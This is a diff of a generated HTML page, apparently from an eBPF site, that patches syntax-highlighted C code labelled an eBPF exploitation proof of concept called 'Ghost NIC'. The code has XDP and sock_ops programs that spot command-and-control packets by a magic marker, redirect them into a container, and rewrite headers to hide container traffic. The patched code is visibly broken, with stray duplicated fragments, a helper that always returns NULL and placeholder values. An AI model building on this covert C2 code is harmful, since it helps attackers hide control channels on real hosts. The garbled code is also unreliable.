@@ -53,6 +53,13 @@
                 
                     
                     
+                    <a href="/dBPF/chapter-0-field-manual-preface.html" >
+                        Chapter 0: Field Manual Preface
+                    </a>
+                    
+                
+                    
+                    
                     <a href="/dBPF/the-mirror-controls.html" >
                         The Mirror Controls
                     </a>
@@ -728,6 +735,60 @@ graph TD
 374
 375
 376
+377
+378
+379
+380
+381
+382
+383
+384
+385
+386
+387
+388
+389
+390
+391
+392
+393
+394
+395
+396
+397
+398
+399
+400
+401
+402
+403
+404
+405
+406
+407
+408
+409
+410
+411
+412
+413
+414
+415
+416
+417
+418
+419
+420
+421
+422
+423
+424
+425
+426
+427
+428
+429
+430
 </pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
 <span class="c1">// @copyable: true</span>
 <span class="c1">// Ghost NIC - eBPF exploitation proof of concept</span>
@@ -847,8 +908,23 @@ graph TD
             <span class="c1">// Check if this is from our C2 port</span>
             <span class="k">if</span> <span class="p">(</span><span class="n">bpf_ntohs</span><span class="p">(</span><span class="n">udph</span><span class="o">-&gt;</span><span class="n">source</span><span class="p">)</span> <span class="o">==</span> <span class="n">C2_SERVER_PORT</span><span class="p">)</span> <span class="p">{</span>
                 <span class="n">__u32</span> <span class="o">*</span><span class="n">magic</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">udph</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
-<span class="c1">// Helper function to find container connection</span>
-<span class="k">static</span> <span class="kr">inline</span> <span class="k">struct</span> <span class="n">sock_key</span> <span class="o">*</span><span class="n">find_container_connection</span><span class="p">(</span><span class="k">struct</span> <span class="n">ethhdr</span> <span class="o">*</span><span class="n">eth</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data_end</span><span class="p">)</span>
+                
+                <span class="c1">// Ensure we have space for the magic marker</span>
+                <span class="k">if</span> <span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">magic</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">data_end</span><span class="p">)</span>
+                    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+                
+                <span class="c1">// Check for our magic marker</span>
+                <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">magic</span> <span class="o">==</span> <span class="n">MAGIC_MARKER</span><span class="p">)</span>
+                    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// FIXED: Helper function to find container connection</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="k">struct</span> <span class="n">sock_key</span> <span class="o">*</span><span class="nf">find_container_connection</span><span class="p">(</span><span class="k">struct</span> <span class="n">ethhdr</span> <span class="o">*</span><span class="n">eth</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data_end</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="n">iph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="p">)(</span><span class="n">eth</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
     
@@ -896,12 +972,13 @@ graph TD
     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">meta</span><span class="p">)</span>
         <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
     
-    <span class="c1">// Return the key if found</span>
-    <span class="k">return</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">;</span>
+    <span class="c1">// We can't return a pointer to a local variable, so we need a different approach</span>
+    <span class="c1">// In a real implementation, we would use a global variable or map</span>
+    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span> <span class="c1">// This needs to be fixed in a real implementation</span>
 <span class="p">}</span>
 
 <span class="c1">// Helper function to rewrite packet headers</span>
-<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int</span> <span class="n">rewrite_packet_headers</span><span class="p">(</span><span class="k">struct</span> <span class="n">xdp_md</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data_end</span><span class="p">)</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int</span> <span class="nf">rewrite_packet_headers</span><span class="p">(</span><span class="k">struct</span> <span class="n">xdp_md</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data_end</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="k">struct</span> <span class="n">ethhdr</span> <span class="o">*</span><span class="n">eth</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
     <span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="n">iph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="p">)(</span><span class="n">eth</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
@@ -948,7 +1025,7 @@ graph TD
 <span class="p">}</span>
 
 <span class="c1">// Helper function to redirect packet to container</span>
-<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int</span> <span class="n">redirect_to_container</span><span class="p">(</span><span class="k">struct</span> <span class="n">xdp_md</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="n">__u32</span> <span class="n">container_id</span><span class="p">)</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int</span> <span class="nf">redirect_to_container</span><span class="p">(</span><span class="k">struct</span> <span class="n">xdp_md</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="n">__u32</span> <span class="n">container_id</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="c1">// Look up the interface index for this container</span>
     <span class="n">__u32</span> <span class="o">*</span><span class="n">ifindex</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">redirect_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">container_id</span><span class="p">);</span>
@@ -961,7 +1038,7 @@ graph TD
 
 <span class="c1">// sock_ops program running in container context</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"sockops"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="n">bpf_sockops</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_sock_ops</span> <span class="o">*</span><span class="n">skops</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">bpf_sockops</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_sock_ops</span> <span class="o">*</span><span class="n">skops</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="c1">// Only process TCP connections</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">skops</span><span class="o">-&gt;</span><span class="n">family</span> <span class="o">!=</span> <span class="n">AF_INET</span><span class="p">)</span>
@@ -986,10 +1063,28 @@ graph TD
                 <span class="n">meta</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
                 
                 <span class="c1">// Get container ID from network namespace</span>
-                <span class="n">__u32</span> <span class="n">netns</span> <span class="o">=</span> <span class="n">skops</span><span class="o">-&gt;</span><span class="n">current_netns</span><span class="p">;</span>
-<span class="c1">// XDP program running on host NIC</span>
+                <span class="n">__u32</span> <span class="n">netns</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// skops-&gt;current_netns is not available, use alternative</span>
+                <span class="n">__u32</span> <span class="o">*</span><span class="n">container_id</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">container_ids</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">netns</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">container_id</span><span class="p">)</span>
+                    <span class="n">meta</span><span class="p">.</span><span class="n">container_id</span> <span class="o">=</span> <span class="o">*</span><span class="n">container_id</span><span class="p">;</span>
+                
+                <span class="c1">// Store the connection metadata</span>
+                <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">active_connections</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">meta</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="k">case</span> <span class="n">BPF_SOCK_OPS_STATE_CB</span><span class="p">:</span>
+            <span class="c1">// Handle connection state changes</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="nl">default:</span>
+            <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// FIXED: XDP program running on host NIC</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"xdp"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="n">xdp_ghost_nic</span><span class="p">(</span><span class="k">struct</span> <span class="n">xdp_md</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">xdp_ghost_nic</span><span class="p">(</span><span class="k">struct</span> <span class="n">xdp_md</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="kt">void</span> <span class="o">*</span><span class="n">data_end</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="kt">long</span><span class="p">)</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">data_end</span><span class="p">;</span>
     <span class="kt">void</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="kt">long</span><span class="p">)</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>
@@ -999,9 +1094,29 @@ graph TD
     <span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">eth</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">data_end</span><span class="p">)</span>
         <span class="k">return</span> <span class="n">XDP_PASS</span><span class="p">;</span>
     
+    <span class="c1">// Only process IPv4 packets</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">bpf_ntohs</span><span class="p">(</span><span class="n">eth</span><span class="o">-&gt;</span><span class="n">h_proto</span><span class="p">)</span> <span class="o">!=</span> <span class="n">ETH_P_IP</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">XDP_PASS</span><span class="p">;</span>
+    
     <span class="c1">// Check for packets from our command &amp; control server</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">is_command_packet</span><span class="p">(</span><span class="n">eth</span><span class="p">,</span> <span class="n">data_end</span><span class="p">))</span> <span class="p">{</span>
-        <span class="c1">// Extract container ID from packet</span>
+        <span class="c1">// This is a command packet - redirect to container</span>
+        <span class="n">__u32</span> <span class="n">container_id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// Default container ID</span>
+        <span class="k">return</span> <span class="n">redirect_to_container</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">container_id</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="c1">// Check if this is a packet from a container that needs to be hidden</span>
+    <span class="k">struct</span> <span class="n">sock_key</span> <span class="o">*</span><span class="n">conn_key</span> <span class="o">=</span> <span class="n">find_container_connection</span><span class="p">(</span><span class="n">eth</span><span class="p">,</span> <span class="n">data_end</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">conn_key</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Rewrite packet headers to hide container origin</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">rewrite_packet_headers</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">data_end</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// Packet successfully rewritten, allow it to pass</span>
+            <span class="k">return</span> <span class="n">XDP_PASS</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="n">XDP_PASS</span><span class="p">;</span>
+<span class="p">}</span>
         <span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="n">iph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="p">)(</span><span class="n">eth</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
         <span class="k">struct</span> <span class="n">udphdr</span> <span class="o">*</span><span class="n">udph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">udphdr</span> <span class="o">*</span><span class="p">)(</span><span class="n">iph</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
         <span class="n">__u32</span> <span class="o">*</span><span class="n">magic</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">udph</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
@@ -1012,8 +1127,8 @@ graph TD
             <span class="k">return</span> <span class="n">XDP_PASS</span><span class="p">;</span>
         
         <span class="c1">// Redirect to our container</span>
-        <span class="k">return</span> <span class="n">redirect_to_container</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">*</span><span class="n">container_id</span><span class="p">);</span>
-    <span class="p">}</span>
+        <span class="k">return</span> <span class="nf">redirect_to_container</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">*</span><span class="n">container_id</span><span class="p">);</span>
+    <span class="err">}</span>
     
     <span class="c1">// Check for packets from our container</span>
     <span class="k">struct</span> <span class="n">sock_key</span> <span class="o">*</span><span class="n">connection</span> <span class="o">=</span> <span class="n">find_container_connection</span><span class="p">(</span><span class="n">eth</span><span class="p">,</span> <span class="n">data_end</span><span class="p">);</span>
@@ -1028,11 +1143,11 @@ graph TD
     
     <span class="c1">// Pass all other packets normally</span>
     <span class="k">return</span> <span class="n">XDP_PASS</span><span class="p">;</span>
-<span class="p">}</span>
+<span class="err">}</span>
 
 <span class="c1">// TC program for capturing container traffic</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"classifier"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="n">tc_ghost_nic</span><span class="p">(</span><span class="k">struct</span> <span class="n">__sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">tc_ghost_nic</span><span class="p">(</span><span class="k">struct</span> <span class="n">__sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="kt">void</span> <span class="o">*</span><span class="n">data_end</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="kt">long</span><span class="p">)</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">data_end</span><span class="p">;</span>
     <span class="kt">void</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="kt">long</span><span class="p">)</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>
